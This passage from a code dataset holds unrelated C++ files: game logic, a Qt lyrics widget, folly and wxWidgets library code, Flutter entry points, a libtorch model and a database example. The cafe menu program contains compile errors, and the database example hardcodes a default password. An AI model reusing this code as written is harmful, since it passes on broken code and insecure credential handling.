{\n                Score += 15;\n                Game[i][j] = Game[i - 1][j] = Game[i - 1][j + 1] = 0;\n            }\n            //Elbow (top-left) candies\n            else if (i - 1 >= 0 && j - 1 >= 0 && Game[i - 1][j] == CurrentCandy && Game[i - 1][j - 1] == CurrentCandy) {\n                Score += 15;\n                Game[i][j] = Game[i - 1][j] = Game[i - 1][j - 1] = 0;\n            }\n\n            //5 horizontal candies\n            else if (j + 4 < GridSize && Game[i][j + 1] == CurrentCandy && Game[i][j + 2] == CurrentCandy && Game[i][j + 3] == CurrentCandy && Game[i][j + 4] == CurrentCandy) {\n                Score += 30;\n                Game[i][j] = Game[i][j + 1] = Game[i][j + 2] = Game[i][j + 3] = Game[i][j + 4] = 0;\n            }\n            //5 vertical candies\n            else if (i + 4 < GridSize && Game[i + 1][j] == CurrentCandy && Game[i + 2][j] == CurrentCandy && Game[i + 3][j] == CurrentCandy && Game[i + 4][j] == CurrentCandy) {\n                Score += 30;\n                Game[i][j] = Game[i + 1][j] = Game[i + 2][j] = Game[i + 3][j] = Game[i + 4][j] = 0;\n            }\n            //5 \\-diagonal candies\n            else if (i - 4 >= 0 && j - 4 >= 0 && Game[i - 1][j - 1] == CurrentCandy && Game[i - 2][j - 2] == CurrentCandy && Game[i - 3][j - 3] == CurrentCandy && Game[i - 4][j - 4] == CurrentCandy) {\n                Score += 30;\n                Game[i][j] = Game[i - 1][j - 1] = Game[i - 2][j - 2] = Game[i - 3][j - 3] = Game[i - 4][j - 4] = 0;\n            }\n            //5 /-diagonal candies\n            else if (i + 4 < GridSize && j - 4 >= 0 && Game[i + 1][j - 1] == CurrentCandy && Game[i + 2][j - 2] == CurrentCandy && Game[i + 3][j - 3] == CurrentCandy && Game[i + 4][j - 4] == CurrentCandy) {\n                Score += 30;\n                Game[i][j] = Game[i + 1][j - 1] = Game[i + 2][j - 2] = Game[i + 3][j - 3] = Game[i + 4][j - 4] = 0;\n            }\n\n            //4 horizontal candies\n            else if (j + 3 < GridSize && Game[i][j + 1] == CurrentCandy && Game[i][j + 2] == CurrentCandy && Game[i][j + 3] == CurrentCandy) {\n                Score += 20;\n                Game[i][j] = Game[i][j + 1] = Game[i]",
    "#include \"lrcwidget.h\"\n#include \"ui_lrcwidget.h\"\n#include<QLabel>\n#include<QPainter>\n#include<QGraphicsBlurEffect>\n#include <QRegularExpression>\n#include<QFile>\n#include<QMap>\n#include<QTime>\n#include <QGraphicsScene>\n#include <QGraphicsPixmapItem>\n\nlrcwidget::lrcwidget(QWidget *parent) :\n    QWidget(parent),\n    ui(new Ui::lrcwidget)\n{\n    ui->setupUi(this);\n\n\n    coverPixmap.load(\":/images/images/KK.jpg\");\n\n    // \u521b\u5efa\u5e76\u521d\u59cb\u5316 stackedWidget\n    stackedWidget = new QStackedWidget(this);\n    //stackedWidget->setGeometry(this->rect());\n\n\n    // \u521d\u59cb\u5316 noLyricsLabel\n    noLyricsLabel = new QLabel(stackedWidget);\n    noLyricsLabel->setText(\n        \"    \u5929\u5728\u5c06\u9ed1\u672a\u9ed1\u65f6\u6700\u7f8e\\n\\n\"\n        \"    \u56e0\u4e3a\u90a3\u65f6\u8d70\u5728\u56de\u5bb6\u7684\u8def\u4e0a\\n\\n\"\n        \"    \u7231\u5728\u5c06\u7231\u672a\u7231\u65f6\u6700\u8ff7\u4eba\\n\\n\"\n        \"    \u56e0\u4e3a\u5fc3\u52a8\u4f34\u968f\u7740\u7f8e\u597d\u7684\u5e62\u666f\\n\\n\"\n        \"    \u5e78\u798f\u5f80\u5f80\u5728\u5c06\u6765\u672a\u6765\u65f6\u6700\u5e78\u798f\"\n        );\n    noLyricsLabel->setAlignment(Qt::AlignCenter);\n    noLyricsLabel->setStyleSheet(\"color: white; font-size: 20pt; padding: 20px;\");\n    noLyricsLabel->setWordWrap(true);\n    noLyricsLabel->setAttribute(Qt::WA_TransparentForMouseEvents);\n\n    // \u8bbe\u7f6e noLyricsLabel \u7684\u5b57\u4f53\n    QFont font;\n    font.setFamily(\"Times New Roman\");\n    font.setPointSize(15);\n    font.setBold(true);\n    font.setItalic(false);\n    noLyricsLabel->setFont(font);\n\n\n    stackedWidget->setGeometry(320,80,500,400);\n\n\n\n\n    // \u5c06 noLyricsLabel \u6dfb\u52a0\u5230 stackedWidget\n    stackedWidget->addWidget(noLyricsLabel);\n\n    // \u5c06 lrc_list \u6dfb\u52a0\u5230 stackedWidget\n    //stackedWidget->addWidget(ui->lrc_list);\n    stackedWidget->setCurrentWidget(noLyricsLabel);\n\n\n    // \u8c03\u6574\u6309\u94ae\u5c42\u7ea7\u5173\u7cfb\n    ui->pushButton->raise();\n\n    //\u521b\u5efa\u52a8\u753b\u5bf9\u8c61\n    ui->lrc_list->setStyleSheet(\n        \"QListWidget {\"\n        \"    background: transparent;\"      // \u8bbe\u7f6e\u80cc\u666f\u900f\u660e\n        \"    font-family: 'Arial';\"     // \u8bbe\u7f6e\u5b57\u4f53\u5bb6\u65cf\n        \"    font-size: 15pt;\"          // \u8bbe\u7f6e\u5b57\u4f53\u5927\u5c0f\n        \"    border: none;\"                 // \u53d6\u6d88\u8fb9\u6846\n        \"}\"\n        \"QListWidget::item {\"\n        \"    color: white;\"                 // \u8bbe\u7f6e\u6587\u5b57\u989c\u8272\u4e3a\u767d\u8272\n        \"    text-align: center;\"           // \u6587\u5b57\u5c45\u4e2d\u663e\u793a\n        \"    padding: 10px 0px;\"        // \u8bbe\u7f6e\u4e0a\u4e0b\u8fb9\u8ddd\u4e3a10px\uff0c\u5de6\u53f3\u8fb9\u8ddd\u4e3a0px\n        \"}\"\n\n        \"QListWidget::item:selected {\"\n        \"    color: yellow;\"\n\n        \"    font-weight: bold;\"\n        \"}\"\n        );\n\n    ui->lrc_list->setVerticalScrollBarPolicy(Qt::ScrollBarAlwaysOff);\n    ui->lrc_list->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOff);\n    ui->labCov->setAlignment(Qt::AlignCenter | Qt::AlignVCenter);\n    ui->labCov->setStyleSheet(\"margin: 0px; padding: 0px; border: none;\");\n\n\n    animation = new QPropertyAnimation(this, \"geometry\", this);\n    animation->setDuration(500);//\u52a8\u753b\u6301\u7eed\u65f6\u95f4\n    animation->setEasingCurve(QEasingCurve::OutQuad);//\u4f7f\u7528\u7f13\u52a8\u66f2\u7ebf\n\n    connect(ui->horizontalSlider, &QSlider::sliderMoved, this, &lrcwidget::on_horizontalSlider_sliderMoved);\n    connect(ui->horizontalSlider, &QSlider::sliderPressed, this, &lrcwidget::on_horizontalSlider_sliderPressed);\n    connect(ui->horizontalSlider, &QSlider::sliderReleased, this, &lrcwidget::on_horizontalSlider_sliderReleased);\n\n\n}\n\nlrcwidget::~lrcwidget()\n{\n    delete ui;\n}\n\n\nQSlider* lrcwidget::getSlider() const {\n    return ui->horizontalSlider;\n}\n\nQPushButton* lrcwidget::getPlayButton() const {\n    return ui->btnPlay;\n}\n\nQPushButton* lrcwidget::getPrevButton() const {\n    return ui->btnPrev;\n}\n\nQPushButton* lrcwidget::getNextButton() const {\n    return ui->btnNext;\n}\n\nQSlider* lrcwidget::getSoundSlider() const {\n    return ui->soundSlider;\n}\n\nQDoubleSpinBox* lrcwidget::getSpeedSpinBox() const {\n    return ui->spinBoxSpeed;\n}\n\nQPushButton* lrcwidget::getModeButton() const {\n    return ui->btnMode;\n}\n\nvoid lrcwidget::updateLabProcess(const QString &text)\n{\n    ui->labProcess->setText(text);\n}\n\n\nvoid lrcwidget::loadLyrics(const QString &filePath)\n{\n    lyricsMap = parseLyrics(filePath);\n    ui->lrc_list->clear();\n\n    if (lyricsMap.isEmpty()) {\n        stackedWidget->show();\n    } else {\n        stackedWidget->hide();\n\n        for (auto it = lyricsMap.begin(); it != lyricsMap.end(); ++it) {\n            QListWidgetItem *item = new QListWidgetItem(it.value());\n            item->setTextAlignment(Qt::AlignCenter);\n            ui->lrc_list->addItem(item);\n        }\n\n        // \u66f4\u65b0\u5217\u8868\u9ad8\u5ea6\u4ee5\u9002\u5e94\u884c\n        updateListHeight();\n    }\n}\n\nQMap<QTime, QString> lrcwidget::parseLyrics(const QString &filePath)\n{\n    QFile file(filePath);\n    //QMap<QTime, QString> lyricsMap;\n    if(file.open(QIODevice::ReadOnly | QIODevice::Text)) {\n        lyricsMap.clear();\n        QTextStream in(&file);\n\n        QRegularExpression regex(R\"(\\[(\\d{2}):(\\d{2})(?::(\\d{2}))?\\](.*))\");\n\n\n        while(!in.atEnd()){\n            QString line = in.readLine();\n            QRegularExpressionMatch match = regex.match(line);\n            if(match.hasMatch()){\n                int minutes = match.captured(1).toInt();\n                int seconds = match.captured(2).toInt();\n\n                int milliseconds = match.captured(3).isEmpty() ? 0 : match.captured(3).toInt() * 10;\n                QString text = match.captured(4).trimmed();\n\n                QTime time(0, minut",
    "/*\n * Copyright (c) Meta Platforms, Inc. and affiliates.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include <folly/concurrency/CacheLocality.h>\n\n#ifndef _MSC_VER\n#define _GNU_SOURCE 1 // for RTLD_NOLOAD\n#include <dlfcn.h>\n#endif\n#include <fstream>\n#include <mutex>\n\n#include <fmt/core.h>\n\n#include <glog/logging.h>\n#include <folly/Conv.h>\n#include <folly/Exception.h>\n#include <folly/Indestructible.h>\n#include <folly/Memory.h>\n#include <folly/Optional.h>\n#include <folly/ScopeGuard.h>\n#include <folly/detail/StaticSingletonManager.h>\n#include <folly/hash/Hash.h>\n#include <folly/portability/Unistd.h>\n#include <folly/system/ThreadId.h>\n\nnamespace folly {\n\n///////////// CacheLocality\n\n/// Returns the CacheLocality information best for this machine\nstatic CacheLocality getSystemLocalityInfo() {\n  if (kIsLinux) {\n    try {\n      return CacheLocality::readFromProcCpuinfo();\n    } catch (...) {\n      // keep trying\n    }\n  }\n\n  long numCpus = sysconf(_SC_NPROCESSORS_CONF);\n  if (numCpus <= 0) {\n    // This shouldn't happen, but if it does we should try to keep\n    // going.  We are probably not going to be able to parse /sys on\n    // this box either (although we will try), which means we are going\n    // to fall back to the SequentialThreadId splitter.  On my 16 core\n    // (x hyperthreading) dev box 16 stripes is enough to get pretty good\n    // contention avoidance with SequentialThreadId, and there is little\n    // improvement from going from 32 to 64.  This default gives us some\n    // wiggle room\n    numCpus = 32;\n  }\n  return CacheLocality::uniform(size_t(numCpus));\n}\n\ntemplate <>\nconst CacheLocality& CacheLocality::system<std::atomic>() {\n  static std::atomic<const CacheLocality*> cache;\n  auto value = cache.load(std::memory_order_acquire);\n  if (value != nullptr) {\n    return *value;\n  }\n  auto next = new CacheLocality(getSystemLocalityInfo());\n  if (cache.compare_exchange_strong(value, next, std::memory_order_acq_rel)) {\n    return *next;\n  }\n  delete next;\n  return *value;\n}\n\n// Each level of cache has sharing sets, which are the set of cpus\n// that share a common cache at that level.  These are available in a\n// hex bitset form (/sys/devices/system/cpu/cpu0/index0/shared_cpu_map,\n// for example).  They are also available in a human-readable list form,\n// as in /sys/devices/system/cpu/cpu0/index0/shared_cpu_list.  The list\n// is a comma-separated list of numbers and ranges, where the ranges are\n// a pair of decimal numbers separated by a '-'.\n//\n// To sort the cpus for optimum locality we don't really need to parse\n// the sharing sets, we just need a unique representative from the\n// equivalence class.  The smallest value works fine, and happens to be\n// the first decimal number in the file.  We load all of the equivalence\n// class information from all of the cpu*/index* directories, order the\n// cpus first by increasing last-level cache equivalence class, then by\n// the smaller caches.  Finally, we break ties with the cpu number itself.\n\n/// Returns the first decimal number in the string, or throws an exception\n/// if the string does not start with a number terminated by ',', '-',\n/// '\\n', or eos.\nstatic size_t parseLeadingNumber(const std::string& line) {\n  auto raw = line.c_str();\n  char* end;\n  unsigned long val = strtoul(raw, &end, 10);\n  if (end == raw || (*end != ',' && *end != '-' && *end != '\\n' && *end != 0)) {\n    throw std::runtime_error(\n        to<std::string>(\"error parsing list '\", line, \"'\").c_str());\n  }\n  return val;\n}\n\nCacheLocality CacheLocality::readFromSysfsTree(\n    const std::function<std::string(std::string)>& mapping) {\n  // number of equivalence classes per level\n  std::vector<size_t> numCachesByLevel;\n\n  // the list of cache equivalence classes, where equivalance classes\n  // are named by the smallest cpu in the class\n  std::vector<std::vector<size_t>> equivClassesByCpu;\n\n  std::vector<size_t> cpus;\n\n  while (true) {\n    auto cpu = cpus.size();\n    std::vector<size_t> levels;\n    for (size_t index = 0;; ++index) {\n      auto dir = fmt::format(\n          \"/sys/devices/system/cpu/cpu{}/cache/index{}/\", cpu, index);\n      auto cacheType = mapping(dir + \"type\");\n      auto equivStr = mapping(dir + \"shared_cpu_list\");\n      if (cacheType.empty() || equivStr.empty()) {\n        // no more caches\n        break;\n      }\n      if (cacheType[0] == 'I') {\n        // cacheType in { \"Data\", \"Instruction\", \"Unified\" }. skip icache\n        continue;\n      }\n      auto equiv = parseLe",
    "/////////////////////////////////////////////////////////////////////////////\n// Name:        src/msw/cursor.cpp\n// Purpose:     wxCursor class\n// Author:      Julian Smart\n// Modified by:\n// Created:     01/02/97\n// Copyright:   (c) 1997-2003 Julian Smart and Vadim Zeitlin\n// Licence:     wxWindows licence\n/////////////////////////////////////////////////////////////////////////////\n\n// ============================================================================\n// declarations\n// ============================================================================\n\n// ----------------------------------------------------------------------------\n// headers\n// ----------------------------------------------------------------------------\n\n// For compilers that support precompilation, includes \"wx.h\".\n#include \"wx/wxprec.h\"\n\n\n#include \"wx/cursor.h\"\n\n#ifndef WX_PRECOMP\n    #include \"wx/utils.h\"\n    #include \"wx/app.h\"\n    #include \"wx/bitmap.h\"\n    #include \"wx/icon.h\"\n    #include \"wx/settings.h\"\n    #include \"wx/intl.h\"\n    #include \"wx/image.h\"\n    #include \"wx/module.h\"\n#endif\n\n#include \"wx/display.h\"\n\n#include \"wx/msw/private.h\"\n#include \"wx/msw/missing.h\" // IDC_HAND\n\n// ----------------------------------------------------------------------------\n// private classes\n// ----------------------------------------------------------------------------\n\nclass WXDLLEXPORT wxCursorRefData : public wxGDIImageRefData\n{\npublic:\n    // the second parameter is used to tell us to delete the cursor when we're\n    // done with it (normally we shouldn't call DestroyCursor() this is why it\n    // doesn't happen by default)\n    wxCursorRefData(HCURSOR hcursor = 0, bool takeOwnership = false);\n\n    virtual ~wxCursorRefData() { Free(); }\n\n    virtual void Free() wxOVERRIDE;\n\n\n    // return the size of the standard cursor: notice that the system only\n    // supports the cursors of this size\n    static wxCoord GetStandardWidth();\n    static wxCoord GetStandardHeight();\n\nprivate:\n    bool m_destroyCursor;\n};\n\n// ----------------------------------------------------------------------------\n// wxWin macros\n// ----------------------------------------------------------------------------\n\nwxIMPLEMENT_DYNAMIC_CLASS(wxCursor, wxGDIObject);\n\n// ----------------------------------------------------------------------------\n// globals\n// ----------------------------------------------------------------------------\n\n// Current cursor, in order to hang on to cursor handle when setting the cursor\n// globally\nstatic wxCursor *gs_globalCursor = NULL;\n\n// ----------------------------------------------------------------------------\n// private classes\n// ----------------------------------------------------------------------------\n\nclass wxCursorModule : public wxModule\n{\npublic:\n    virtual bool OnInit() wxOVERRIDE\n    {\n        gs_globalCursor = new wxCursor;\n\n        return true;\n    }\n\n    virtual void OnExit() wxOVERRIDE\n    {\n        wxDELETE(gs_globalCursor);\n    }\n};\n\n// ============================================================================\n// implementation\n// ============================================================================\n\n// ----------------------------------------------------------------------------\n// wxCursorRefData\n// ----------------------------------------------------------------------------\n\n\nwxCoord wxCursorRefData::GetStandardWidth()\n{\n    const wxWindow* win = wxApp::GetMainTopWindow();\n    return wxSystemSettings::GetMetric(wxSYS_CURSOR_X, win);\n}\n\nwxCoord wxCursorRefData::GetStandardHeight()\n{\n    const wxWindow* win = wxApp::GetMainTopWindow();\n    return wxSystemSettings::GetMetric(wxSYS_CURSOR_Y, win);\n}\n\nwxCursorRefData::wxCursorRefData(HCURSOR hcursor, bool destroy)\n{\n    m_hCursor = (WXHCURSOR)hcursor;\n\n    if ( m_hCursor )\n    {\n        m_width = GetStandardWidth();\n        m_height = GetStandardHeight();\n    }\n\n    m_destroyCursor = destroy;\n}\n\nvoid wxCursorRefData::Free()\n{\n    if ( m_hCursor )\n    {\n        if ( m_destroyCursor )\n            ::DestroyCursor((HCURSOR)m_hCursor);\n\n        m_hCursor = 0;\n    }\n}\n\n// ----------------------------------------------------------------------------\n// Cursors\n// ----------------------------------------------------------------------------\n\nwxCursor::wxCursor()\n{\n}\n\n#if wxUSE_IMAGE\nwxCursor::wxCursor(const wxImage& image)\n{\n    // image has to be of the standard cursor size, otherwise we won't be able\n    // to create it\n    const int w = wxCursorRefData::GetStandardWidth();\n    const int h = wxCursorRefData::GetStandardHeight();\n\n    int hotSpotX = image.GetOptionInt(wxIMAGE_OPTION_CUR_HOTSPOT_X);\n    int hotSpotY = image.GetOptionInt(wxIMAGE_OPTION_CUR_HOTSPOT_Y);\n    int image_w = image.GetWidth();\n    int image_h = image.GetHeight();\n\n    wxASSERT_MSG( hotSpotX >= 0 && hotSpotX < image_w &&\n                  hotSpotY >= 0 && hotSpotY < image_h,\n                  wxT(\"invalid cursor hot spot coordinates\") );\n\n    wxImage imageSized(image); // final image of correct size\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"hubtel_coding_challenge\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"navigation\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\r\n#include<vector>\r\nusing namespace std;\r\nclass Menu{\r\n    private:\r\n    string item;\r\n    int price,itemNo;\r\n    public:\r\n    Menu(int ItemNo,string Item,int Price){\r\n        itemNo=ItemNo;\r\n        item=Item;\r\n        price=Price;\r\n    }\r\n    string getItem(){\r\n        return item;\r\n    }\r\n    int getItemNo(){\r\n        return itemNo;\r\n    }\r\n    int getPrice(){\r\n        return price;\r\n    }\r\n};\r\nclass Cafe{\r\n    private:\r\n    vector<Menu>ve;\r\n    public:\r\n    add(int ItemNo,strimg Item,int Price){\r\n        Menu menu(ItemNo,Item,Price);\r\n        ve.push_back(menu);\r\n    }\r\n    order(){\r\n        for(int i=0;i<ve.size();i++){\r\n            cout<<ve[i].getItemNo()<<\".\"<<ve[i].getItem()<<\":\"<<ve[i].etPrice()<<endl;\r\n        }\r\n        item ord,quant;\r\n        cout<<\"Enter item No for order:\";\r\n        cin>>ord;\r\n        cout<<\"Enter quantity of items:\";\r\n        cin>>quant;\r\n        for(int i=0;i<ve.size();i++){\r\n            if(ord==ve[i].getItemNo()){\r\n                int total=quant*ve[i].getPrice();\r\n                cout<<\"Total bill:\"<<total<<endl;\r\n            }\r\n        }\r\n    }\r\n\r\n};\r\nint main(){\r\n    Cafe cafe;\r\n    cafe.add(1,\"Chicken Burger\",150);\r\n    cafe.add(2,\"Zinger Birger\",250);\r\n    cafe.add(3,\"Potato chips\",50);\r\n    cafe.add(4,\"Juice\",100);\r\n    cout<<\"Cafetaria Menu\"<<endl;\r\n    cafe.order();\r\n}",
    "#include <iostream>\n#include <pqxx/pqxx>\n\nint main() {\n    try {\n\t//\n        // Connect to the database\n\t//\n\t//\n        pqxx::connection C(\"dbname=mydb user=postgres password=postgres hostaddr=127.0.0.1 port=5432\");\n        if (C.is_open()) {\n            std::cout << \"Opened database successfully: \" << C.dbname() << std::endl;\n        } else {\n            std::cout << \"Can't open database\" << std::endl;\n            return 1;\n        }\n\n\t//\n        // Create a transactional object\n\t//\n\t//\n        pqxx::work W(C);\n\n\t//\n        // Create SQL statement\n\t//\n\t//\n        std::string sql = \"INSERT INTO testtbl(name, value) VALUES ('world', 1024);\";\n\n\t// \n        // Execute SQL query\n\t//\n\t//\n        W.exec(sql);\n        W.commit();\n        std::cout << \"Tuple inserted successfully\" << std::endl;\n\n\n\t//\n\t// Create a non-transactional object to query the database\n\t//\n\t//\n        pqxx::nontransaction N(C);\n\n\t//\n\t// Create SQL statement to query all tuples\n\t//\n\t//\n        std::string sqlSelect = \"SELECT name, value FROM testtbl;\";\n\n\t//\n        // Execute SQL query to select all tuples\n\t//\n\t//\n        pqxx::result R(N.exec(sqlSelect));\n\n\t//\n        // Print the queried tuples\n\t//\n\t//\n        std::cout << \"Table testtbl contains the following tuples:\\nname \\tvalue\" << std::endl;\n        for (auto row : R) {\n            std::cout << row[\"name\"].as<std::string>() << \" \\t\" << row[\"value\"].as<int>() << std::endl;\n        }\n\n\t//\n        // Close the database connection\n\t//\n\t//\n        C.disconnect();\n\n\tstd::cout << \"Disconnected from the database\" << std::endl;\n    } catch (const std::exception &e) {\n        std::cerr << e.what() << std::endl;\n        return 1;\n    }\n\n    return 0;\n}\n",
    "#include \"model.h\"\n\nint64_t make_divisible(int64_t x, int64_t divisor) {\n    return (x + divisor / 2) / divisor * divisor;\n}\n\nConvBNSiLU::ConvBNSiLU(int64_t in_channels, int64_t out_channels, int64_t kernel_size, int64_t stride, int64_t padding) {\n    conv = register_module(\"conv\", torch::nn::Conv2d(torch::nn::Conv2dOptions(in_channels, out_channels, kernel_size).stride(stride).padding(padding).bias(false)));\n    bn = register_module(\"bn\", torch::nn::BatchNorm2d(out_channels));\n}\n\ntorch::Tensor ConvBNSiLU::forward(torch::Tensor& x) {\n    return silu(bn->forward(conv->forward(x)));\n}\n\nBottleNeck::BottleNeck(int64_t in_channels, int64_t out_channels) {\n    conv1 = register_module(\"conv1\", std::make_shared<ConvBNSiLU>(in_channels, out_channels, 1, 1, 0));\n    conv2 = register_module(\"conv2\", std::make_shared<ConvBNSiLU>(out_channels, out_channels, 3, 1, 1));\n}\n\ntorch::Tensor BottleNeck::forward(torch::Tensor x) {\n    torch::Tensor y = conv1->forward(x);\n    y = conv2->forward(y);\n    return y += x;\n}\n\nC3::C3(int64_t in_channels, int64_t out_channels, int64_t num_bottlenecks, float depth_multiple) {\n    num_bottlenecks = std::max(static_cast<int64_t>(std::round(num_bottlenecks * depth_multiple)), static_cast<int64_t>(1));\n    for (int64_t i = 0; i < num_bottlenecks; ++i) {\n        bottleneck_layers->push_back(BottleNeck(out_channels / 2, out_channels / 2));\n    }\n    conv1 = register_module(\"conv1\", std::make_shared<ConvBNSiLU>(in_channels, out_channels / 2, 1, 1, 0));\n    conv2 = register_module(\"conv2\", std::make_shared<ConvBNSiLU>(in_channels, out_channels / 2, 1, 1, 0));\n    register_module(\"bottleneck_layers\", bottleneck_layers);\n    conv3 = register_module(\"conv3\", std::make_shared<ConvBNSiLU>(out_channels, out_channels, 1, 1, 0));\n}\n\ntorch::Tensor C3::forward(torch::Tensor& x) {\n    torch::Tensor y1 = conv1->forward(x);\n    y1 = bottleneck_layers->forward(y1);\n    torch::Tensor y2 = conv2->forward(x);\n    torch::Tensor y = torch::cat({ y1, y2 }, 1);\n    return conv3->forward(y);\n}\n\nNet::Net(int64_t num_classes, int64_t num_anchors, float depth_multiple, float width_multiple) : num_classes(num_classes), num_anchors(num_anchors)  {\n    int64_t p1_out_channels = make_divisible(64 * width_multiple, 8);\n    p1 = register_module(\"p1\", std::make_shared<ConvBNSiLU>(3, p1_out_channels, 6, 2, 2));\n\n    int64_t p2_out_channels = make_divisible(128 * width_multiple, 8);\n    p2 = register_module(\"p2\", std::make_shared<ConvBNSiLU>(p1_out_channels, p2_out_channels, 3, 2, 1));\n\n    c3_1 = register_module(\"c3_1\", std::make_shared<C3>(p2_out_channels, p2_out_channels, 3, depth_multiple));\n\n    int64_t p3_out_channels = make_divisible(256 * width_multiple, 8);\n    p3 = register_module(\"p3\", std::make_shared<ConvBNSiLU>(p2_out_channels, p3_out_channels, 3, 2, 1));\n\n    c3_2 = register_module(\"c3_2\", std::make_shared<C3>(p3_out_channels, p3_out_channels, 6, depth_multiple));\n\n    int64_t p4_out_channels = make_divisible(512 * width_multiple, 8);\n    p4 = register_module(\"p4\", std::make_shared<ConvBNSiLU>(p3_out_channels, p4_out_channels, 3, 2, 1));\n\n    c3_3 = register_module(\"c3_3\", std::make_shared<C3>(p4_out_channels, p4_out_channels, 9, depth_multiple));\n\n    int64_t p5_out_channels = make_divisible(1024 * width_multiple, 8);\n    p5 = register_module(\"p5\", std::make_shared<ConvBNSiLU>(p4_out_channels, p5_out_channels, 3, 2, 1));\n\n    c3_4 = register_module(\"c3_4\", std::make_shared<C3>(p5_out_channels, p5_out_channels, 3, depth_multiple));\n\n    int64_t p6_out_channels = make_divisible(1024 * width_multiple, 8);\n    p6 = register_module(\"p6\", std::make_shared<ConvBNSiLU>(p5_out_channels, p6_out_channels, 1, 1, 0));\n\n    c3_5 = register_module(\"c3_5\", std::make_shared<C3>(p6_out_channels, p6_out_channels, 3, depth_multiple));\n\n    int64_t p7_out_channels = make_divisible(1024 * width_multiple, 8);\n    p7 = register_module(\"p7\", std::make_shared<ConvBNSiLU>(p6_out_channels, p7_out_channels, 1, 1, 0));\n\n    c3_6 = register_module(\"c3_6\", std::make_shared<C3>(p7_out_channels, p7_out_channels, 3, depth_multiple));\n\n    int64_t p8_out_channels = make_divisible(1024 * width_multiple, 8);\n    p8 = register_module(\"p8\", std::make_shared<ConvBNSiLU>(p7_out_channels, p8_out_channels, 1, 1, 0));\n    p9 = register_module(\"p9\", std::make_shared<ConvBNSiLU>(p8_out_channels, p8_out_channels, 1, 1, 0));\n    p10 = register_module(\"p10\", std::make_shared<ConvBNSiLU>(p8_out_channels, p8_out_channels, 1, 1, 0));\n\n    loc_layers = register_module(\"loc_layers\", torch::nn::ModuleList());\n    conf_layers = register_module(\"conf_layers\", torch::nn::ModuleList());\n\n    for (int i = 0; i < num_anchors; ++i) {\n        loc_layers->push_back(register_module(\"loc_\" + std::to_string(i), torch::nn::Conv2d(p8_out_channels, 4 * num_anchors, 1)));\n        conf_layers->push_back(register_module(\"conf_\" + std::to_string(i), torch::nn::Conv2d(p8_out_channels, num_classes * num_anchors, 1)));\n    }\n}\n\nstd::pair<torch::Tensor, torch::Tensor> Net::forward(torch::Te",
    "#include <algorithm>\n#include <cassert>\n#include <iostream>\n#include <string>\n#include <sstream>\n#include <string_view>\n#include <vector>\n\nusing namespace std;\n\nstring StrToDomainStyle(string str) {\n    reverse(str.begin(), str.end());\n    str.push_back('.');\n    return str;\n}\n\nclass Domain {\npublic:\n    Domain(string str)\n        : data_(StrToDomainStyle(move(str)))\n    { }\n\n    bool operator==(const Domain& rhs) const {\n        return data_ == rhs.data_;\n    }\n\n    bool operator<(const Domain& rhs) const {\n        return data_ < rhs.data_;\n    }\n\n    bool IsSubdomain(const Domain& other) const {\n        auto it = data_.begin();\n        for (auto other_it = other.data_.begin(); other_it != other.data_.end(); ) {\n            if (*it++ != *other_it++) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    const string& GetData() const {\n        return data_;\n    }\n    \nprivate:\n    string data_;\n};\n\nclass DomainChecker {\npublic:\n    template <typename InputIt>\n    DomainChecker(InputIt first, InputIt last)\n        : domains_{first, last}\n    {\n        sort(domains_.begin(), domains_.end(),\n            [](const Domain& lhs, const Domain& rhs) {\n                return lhs.GetData() < rhs.GetData();\n            });\n        auto new_last = unique(domains_.begin(), domains_.end(),\n                            [](const Domain& lhs, const Domain& 